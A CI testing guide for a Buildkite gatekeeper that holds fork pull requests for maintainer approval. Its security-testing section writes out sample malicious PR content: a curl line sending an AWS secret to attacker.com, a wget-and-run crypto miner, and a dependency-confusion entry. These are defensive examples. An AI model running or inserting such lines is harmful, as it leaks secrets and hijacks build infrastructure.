# Gatekeeper Testing Guide

This document provides comprehensive testing procedures for the Buildkite security gatekeeper.

## Unit Tests

We've included an automated test script for the fork detection logic:

```bash
# Run fork detection tests
./ci/scripts/test-gatekeeper.sh
```

Expected output:
```
✅ External Fork (https)
✅ Internal PR (git protocol)
✅ Internal PR (https protocol)
✅ External Fork (git protocol)
✅ Branch Push (no PR)
✅ Case Sensitivity Test
✅ Different Repo Name
```

## Integration Testing

### Test 1: Internal PR (Should Pass Without Approval)

**Setup:**
1. Create a branch in the main repository
2. Make a small change (e.g., update a comment)
3. Open a PR from the branch to `main`

**Expected Behavior:**
- Gatekeeper pipeline triggers
- Detection step shows: `✅ Internal PR detected`
- **No block step** appears
- CI pipeline uploads immediately
- Full CI runs automatically

**Verification:**
```bash
# In Buildkite job logs, you should see:
=== PR Source Detection ===
PR Repository: git://github.com/risingwavelabs/risingwave.git
Main Repository: git://github.com/risingwavelabs/risingwave.git
✅ Internal PR detected
=== Result: IS_FORK=false ===
```

### Test 2: External PR (Should Require Approval)

**Setup:**
1. Create a fork of `risingwavelabs/risingwave` to your personal account
2. Make a small change in the fork
3. Open a PR from the fork to `main`

**Expected Behavior:**
- Gatekeeper pipeline triggers
- Detection step shows: `⚠️ Fork PR detected`
- **Block step** appears with approval form
- CI waits for manual approval
- GitHub PR receives notification comment

**Verification:**
```bash
# In Buildkite job logs:
=== PR Source Detection ===
PR Repository: git://github.com/your-username/risingwave.git
Main Repository: git://github.com/risingwavelabs/risingwave.git
⚠️ Fork PR detected: git://github.com/your-username/risingwave.git
=== Result: IS_FORK=true ===
```

**Block Step UI:**
You should see a "Security Review Required" block with:
- Pre-approval checklist
- Approval decision dropdown (Approve/Reject/Request Changes)
- Security review notes field

### Test 3: Approval Flow

**Setup:**
Use the external PR from Test 2.

**Test Approve:**
1. In Buildkite, click "Unblock" on the block step
2. Select: `✅ Approve - Run Full CI`
3. Add optional notes
4. Click "Continue"

**Expected:**
- Approval verification step logs the decision
- CI pipeline uploads
- Full CI runs
- GitHub PR receives approval comment
- Label changes from `ci/pending-approval` to `ci/approved`

**Test Reject:**
1. Create another external PR (or rebuild)
2. In Buildkite, click "Unblock"
3. Select: `❌ Reject - Do Not Run CI`
4. Click "Continue"

**Expected:**
- Pipeline fails with rejection message
- CI does not run
- Optional: Comment posted to GitHub explaining rejection

**Test Request Changes:**
1. Create another external PR
2. Click "Unblock"
3. Select: `📝 Request Changes - Wait for Updates`
4. Add required changes description
5. Click "Continue"

**Expected:**
- Pipeline fails with request message
- CI does not run
- Contributor can update PR and push new commits to re-trigger

### Test 4: GitHub Actions Integration

**Setup:**
Create an external PR.

**Expected GitHub Behavior:**
- PR automatically gets labels: `ci/external-pr`, `ci/pending-approval`
- Bot comment appears:
  ```
  ## 🔒 External Contributor CI Workflow

  Hello @contributor! Thank you for your contribution...

  ### CI Status: ⏳ Pending Approval
  ```

**After Approval:**
- Comment updated:
  ```
  ✅ **CI Approved** by @maintainer

  The full CI pipeline has been triggered...
  ```
- Label changes to `ci/approved`
- `ci/pending-approval` label removed

### Test 5: Main-Cron Gatekeeper

**Setup:**
Create an external PR and add the `ci/main-cron/run-all` label.

**Expected:**
- Main-cron gatekeeper triggers (if configured separately)
- Extended approval form appears with:
  - Main-cron specific checklist
  - Full/Limited/Reject options
  - Required review notes field

### Test 6: Edge Cases

#### Test 6a: Empty PR Description
- Create external PR with minimal description
- Verify approval still works

#### Test 6b: Force Push After Approval
1. Approve external PR
2. Contributor force pushes new commits
3. Verify: New commit requires **re-approval**

#### Test 6c: Draft PR
- Create external draft PR
- Verify: Should still require approval (draft status is separate from gatekeeper)

#### Test 6d: PR From Organization Fork
- Create fork under an organization (not personal account)
- Open PR
- Verify: Detected as external fork, requires approval

## Manual Verification Checklist

Use this checklist when testing in production:

### Pipeline Configuration
- [ ] Webhook points to gatekeeper pipeline
- [ ] "Build pull requests from forks" is enabled
- [ ] `GITHUB_TOKEN` secret is configured
- [ ] Pipeline has access to AWS secrets manager

### Internal PR Flow
- [ ] Internal PR triggers gatekeeper
- [ ] Fork detection correctly identifies as internal
- [ ] No block step created
- [ ] CI uploads and runs automatically

### External PR Flow
- [ ] External PR triggers gatekeeper
- [ ] Fork detection correctly identifies as external
- [ ] Block step appears with approval form
- [ ] GitHub labels added (`ci/external-pr`, `ci/pending-approval`)
- [ ] GitHub comment posted

### Approval Flow
- [ ] Approve option works and runs CI
- [ ] Reject option fails pipeline without running CI
- [ ] Request changes option fails with message
- [ ] Audit log records all decisions
- [ ] GitHub labels update after approval

## Troubleshooting Common Issues

### Issue: "CI Not Triggering for External PR"

**Check:**
```bash
# In Buildkite, check environment variables:
echo $BUILDKITE_PULL_REQUEST_REPO
echo $BUILDKITE_REPO
```

**Solution:**
- Verify webhook URL in GitHub
- Check "Build pull requests from forks" is enabled in Buildkite

### Issue: "False Positive (Internal PR marked as external)"

**Check:**
```bash
# Look at the normalized values in logs
PR_REPO_NORMALIZED=risingwavelabs/risingwave
MAIN_REPO_NORMALIZED=risingwavelabs/risingwave
```

**Solution:**
- The comparison might be case-sensitive or protocol mismatch
- Check the normalization logic in gatekeeper

### Issue: "GitHub API Rate Limited"

**Symptom:**
Gatekeeper fails when fetching PR info.

**Solution:**
- Ensure `GITHUB_TOKEN` is set
- Consider using a GitHub App token for higher rate limits

### Issue: "Block Step Not Appearing"

**Check:**
```bash
# Verify the condition evaluation
buildkite-agent meta-data get is_fork
```

**Solution:**
- The `if` condition in block step might not be evaluating correctly
- Check Buildkite's condition syntax documentation

## Load Testing

To verify the gatekeeper handles high PR volume:

```bash
# Simulate multiple PRs
for i in {1..10}; do
    # Create test PRs programmatically via GitHub API
    gh pr create --title "Test PR $i" --body "Testing gatekeeper" --fork
done
```

**Expected:**
- All PRs trigger gatekeeper
- Block steps appear for all external PRs
- System remains responsive

## Security Testing

### Test Malicious PR Detection

Create PRs that attempt:
1. **Secret Exfiltration:**
   ```yaml
   # In .github/workflows/test.yml
   - run: echo "$AWS_SECRET" | curl -X POST https://attacker.com --data @-
   ```
   ➜ Should be caught in review

2. **Crypto Mining:**
   ```yaml
   - run: wget https://miner.com/xmrig && ./xmrig
   ```
   ➜ Should be caught in review

3. **Dependency Confusion:**
   ```toml
   # In Cargo.toml
   [dependencies]
   risingwave-internal = { git = "https://github.com/attacker/fake-repo" }
   ```
   ➜ Should be caught in review

## Rollback Plan

If gatekeeper causes issues:

1. **Immediate:** Update Buildkite pipeline to skip gatekeeper:
   ```yaml
   steps:
     - label: ":pipeline: Direct Upload (Bypass Gatekeeper)"
       command: buildkite-agent pipeline upload ci/workflows/pull-request.yml
   ```

2. **Investigate:** Review gatekeeper logs for errors

3. **Fix:** Update gatekeeper logic and re-deploy

## Success Criteria

Gatekeeper is ready for production when:

- [ ] All unit tests pass
- [ ] Internal PRs flow through without friction
- [ ] External PRs require approval
- [ ] Approval/Reject/Request Changes all work correctly
- [ ] GitHub integration (labels, comments) works
- [ ] Audit logging is functional
- [ ] Documentation is complete
- [ ] Team is trained on approval workflow

## Contact

For issues or questions about gatekeeper testing:
- Slack: `#ci-infrastructure`
- GitHub Issues: Tag with `area/ci` and `kind/testing`
